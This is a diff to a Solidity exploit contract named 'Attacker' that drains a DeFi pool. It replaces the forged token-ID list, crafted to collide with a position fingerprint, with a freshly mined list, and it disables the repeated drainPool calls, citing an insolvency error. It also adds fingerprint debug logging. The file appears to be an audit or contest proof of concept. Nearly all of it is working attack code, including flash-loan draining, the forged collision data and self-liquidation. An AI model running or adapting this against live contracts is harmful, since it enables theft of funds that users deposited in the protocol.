@@ -22,6 +22,7 @@ int24 constant MIN_V3POOL_TICK = -887272;
 int24 constant MAX_V3POOL_TICK = 887272;
 
 contract Attacker is IFlashLoanReceiver {
+    /* Old, attacker-supplied list - lets you drain thrice
     uint256[] fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
         0x004000000c000040000008000040000004000040000000020001000000000002,
@@ -275,6 +276,140 @@ contract Attacker is IFlashLoanReceiver {
         0x004000000c000040000008000040000004000040000000000001f80000000001,
         0x004000000c000040000008000040000004000040000000000001f90000000001
     ];
+    */
+
+    // New smaller list I mined just now - lets you drain once
+    uint256[] fake_token_uints = [
+        0x3c70d785e27fe5,
+        0x3c69c564e59916,
+        0x3cfb28d8f68208,
+        0x3c69c7ac9f2aca,
+        0x3c96aa9aefee84,
+        0x3c9332ed01b4b5,
+        0x3c9411ab8d1b94,
+        0x3c90aa38753453,
+        0x3c62b2a232ead7,
+        0x3c448885509f49,
+        0x3cbea4f877275e,
+        0x3ced0210bf311f,
+        0x3c4d2ac3facd90,
+        0x3ca65f75b178ba,
+        0x3c13f553a8dbd3,
+        0x3c8d8fa16cb417,
+        0x3c5cfd480fff1a,
+        0x3c9c1e2490d23a,
+        0x3c410b7e7ccd3a,
+        0x3ce020b2021227,
+        0x3cc28b48f531e6,
+        0x3c3d940e3994e9,
+        0x3c2c5e48573a0a,
+        0x3c914069e4697b,
+        0x3c62bf221a1162,
+        0x3ca449eb452c06,
+        0x3c64ce7f89b3c7,
+        0x3c782f97962cbe,
+        0x3c169004c8d16c,
+        0x3c86b66f547963,
+        0x3c5bb12749d2b2,
+        0x3c5545af4587ff,
+        0x3c7638b337e95f,
+        0x3cdeabc9caa918,
+        0x3c6a4b773043d9,
+        0x3c7f1ea8fd1ba4,
+        0x3c6c1b4d2d775f,
+        0x3c99c63842aa7c,
+        0x3cdca81655cdae,
+        0x3c2133ea70de18,
+        0x3cf8778483b29f,
+        0x3cd493231e2bce,
+        0x3c8719556da56d,
+        0x3cb5199054ddb5,
+        0x3c0e4941188ebb,
+        0x3c5517978f1ecc,
+        0x3c453a18e7a914,
+        0x3c1eda2886a940,
+        0x3cd033f6427ed5,
+        0x3ca723ddeedc96,
+        0x3c2fc9051e16eb,
+        0x3c868ca18d835a,
+        0x3c4d9e982036e1,
+        0x3c489b71447035,
+        0x3c29a7796b25e8,
+        0x3cc2ee28f1bc74,
+        0x3c0050450104cd,
+        0x3c942f446e49a6,
+        0x3c0ccde84c70ea,
+        0x3c81a2888ef39f,
+        0x3c9f4eba9879d5,
+        0x3c95e9bc5fb087,
+        0x3c3afd3de2adf2,
+        0x3cee67cd0e698d,
+        0x3c44a9cc31272c,
+        0x3c988e67d78d76,
+        0x3c17cceeb6bf5a,
+        0x3c599c11c83964,
+        0x3c3e71a1845d1f,
+        0x3c75b04772d7cd,
+        0x3cff2775b99b21,
+        0x3c74182d604aff,
+        0x3c2b8f997a34a6,
+        0x3c914b428269d2,
+        0x3cfbf0ff15d76b,
+        0x3c920070e29c35,
+        0x3ca38f97d89583,
+        0x3ccf9a265136a2,
+        0x3c0145cdd1f018,
+        0x3c859205c01328,
+        0x3cf7610516178f,
+        0x3cd7657a877057,
+        0x3ccdae799e22cd,
+        0x3cd5a9af10d4c3,
+        0x3cb25220f6083f,
+        0x3ca1972b6660e9,
+        0x3ccf874fe7f088,
+        0x3ce695525f0ad3,
+        0x3c27e37c228cfa,
+        0x3ce3a2b07aaffd,
+        0x3cf5d942208cd8,
+        0x3cc4d6746c7d64,
+        0x3c89cbcc2fe562,
+        0x3cd9055cad5ad5,
+        0x3cd23f3a5d25a8,
+        0x3c06b98b20edae,
+        0x3c9533e54d6078,
+        0x3c5a73db829514,
+        0x3c6ee3f340ca0c,
+        0x3cf4780e58055d,
+        0x3c19cfb8c3152f,
+        0x3c0e43f79290e9,
+        0x3cb02b8593de0e,
+        0x3c78c611b8861c,
+        0x3cd8a918ea6e7c,
+        0x3c9536bea61ec9,
+        0x3ca43520469ed3,
+        0x3c0eeae1d0864a,
+        0x3c33d5f794d0a5,
+        0x3cb6c569084914,
+        0x3c738e7630acab,
+        0x3c44a670b971d9,
+        0x3ce3cae7537c2a,
+        0x3c6718ea814247,
+        0x3cfdeb834f7282,
+        0x3c4c14418ea38b,
+        0x3c71713d41a456,
+        0x3c55f10f7a35da,
+        0x3c3b3f2809befe,
+        0x3c6a0ea2fa5f38,
+        0x3c6d80671895e5,
+        0x3cdce5da9f7d10,
+        0x3c2d0152cb2e2a,
+        0x3cf6b4aa8dd4f6,
+        0x3c5504b6f284e2,
+        0x3c305d3125ab1f,
+        0x3cbe3638b6a4a5,
+        0xdd5ffa56a003003c088558eb25ed,
+        0xdd5ffa56a003003c088558eb25ed
+    ];
 
     IERC20Partial token0 = IERC20Partial(USDC);
     IERC20Partial token1 = IERC20Partial(WETH);
@@ -352,8 +487,11 @@ contract Attacker is IFlashLoanReceiver {
 
     function phase1Attack() public {
         drainPool(); // takes 1/2             = 1/2 of s_poolAssets
+        /* A second and third drain cause AccountInsolvent with the new list,
+           but first list allows this:
         drainPool(); // takes 1/2 + 1/4       = 3/4 of s_poolAssets
         drainPool(); // takes 1/2 + 1/4 + 1/8 = 7/8 of s_poolAssets
+        */
         // ... gas is the limit here, could do 1 more round
     }
 
@@ -500,7 +638,6 @@ contract Attacker is IFlashLoanReceiver {
             fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
         }
 
-
         // Now use the list of positions that don't exist
 
         // calculate how much I can withdraw
@@ -520,15 +657,18 @@ contract Attacker is IFlashLoanReceiver {
         console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
-        console.log('posIdList2 fingerprint', generateFingerprint(posIdList2, 0));
-        console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
+        console.log("posIdList2 fingerprint", generateFingerprint(posIdList2, 0));
+        console.log("fakeTokenIdList fingerprint", generateFingerprint(fakeTokenIdList, 0));
 
         // now liquidate my own position and repeat...
         TokenId[] memory emptyTokenList = new TokenId[](0);
         pp.liquidate(emptyTokenList, address(this), posIdList2);
     }
 
-    function generateFingerprint(TokenId[] memory positionIdList, uint256 offset) internal pure returns (uint256) {
+    function generateFingerprint(
+        TokenId[] memory positionIdList,
+        uint256 offset
+    ) internal pure returns (uint256) {
         uint256 pLength = positionIdList.length - offset;
         uint256 fingerprintIncomingList;
 
@@ -538,6 +678,8 @@ contract Attacker is IFlashLoanReceiver {
                 positionIdList[i],
                 true
             );
+            console.log("fingerprintIncomingList at position index:", i);
+            console.log(fingerprintIncomingList);
             unchecked {
                 ++i;
             }
